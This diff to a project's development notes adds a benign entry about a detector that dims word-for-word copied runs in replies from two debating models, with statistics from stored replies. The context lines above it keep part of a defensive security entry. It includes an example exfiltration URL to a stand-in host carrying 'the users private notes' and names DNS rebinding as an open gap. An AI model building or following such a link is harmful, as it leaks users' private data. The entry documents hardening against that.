@@ -704,3 +704,20 @@ given links only, private addresses refused, pages as untrusted text). Two real 
   `https://evil.example/collect?q=the-users-private-notes` with the mark.
 
 Still open: DNS rebinding between the address check and the connection.
+
+## Verified 2026-10-11 — words already said by someone else
+
+From a list of "dual-thread" features another model proposed: of its ten, the
+attribution diff was the one that is deterministic and fits a desk run by small models.
+Small models parrot, and a reply can be one new sentence wrapped in the other side's
+wording. `public/restate.js` finds runs of six or more words that appeared, word for word, in
+an earlier message by someone else — the other side, or the user; a side repeating itself is
+`echo.js`'s business. The page dims those runs, each naming on hover whose words they were
+(model and side: both sides can run the same model), and a reply that is 40% or more
+restated, over twelve words, carries "≈ N% restated". `duet_context_test` 79/79 (10 new).
+
+Over the 85 stored replies on the desk database: 32 contain at least one copied run, 4 are
+marked. In "Roles v3 (no reasoning): Skeptic vs Optimist", #50 is 100% the other side's
+#47, word for word, and reads fully dimmed. In "Roles v3 (no reasoning): Skeptic vs
+Skeptic", #59 is 59%: "You're correct — the only way to settle it" and "on Llama3-8b
+across" stay bright, the rest is the left side's #58.
